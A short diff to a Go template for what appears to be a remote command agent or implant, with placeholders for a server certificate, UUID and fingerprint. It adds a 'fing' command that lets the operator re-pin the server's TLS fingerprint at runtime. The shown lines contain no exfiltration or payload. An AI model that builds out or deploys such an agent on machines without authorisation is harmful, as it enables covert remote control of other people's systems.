@@ -90,6 +90,7 @@ func getCurrentUser() (name string) {
 	return
 }
 
+var expectedFingerprint uint32
 
 func main() {
     const serverCert = "-----BEGIN CERTIFICATE-----\n{{.ServerKey}}\n-----END CERTIFICATE-----"
@@ -110,7 +111,7 @@ func main() {
 	uuid := "{{.UUID}}"
 	// Construct the client for requests, we define nothing right now but in the future can add functionality
 	//client := &http.Client{}
-	var expectedFingerprint uint32 = {{.Fingerprint}}
+	expectedFingerprint = {{.Fingerprint}}
 	client := &http.Client{
         Transport: &http.Transport{
             TLSClientConfig: &tls.Config{
@@ -249,6 +250,8 @@ func main() {
 		case "pid":
 		    pid := os.Getpid()
 		    result = fmt.Sprint(pid)
+		case "fing":
+			expectedFingerprint = StrH(sb1[1])
 
 		//case "groups":
 		//    result := getGroups()
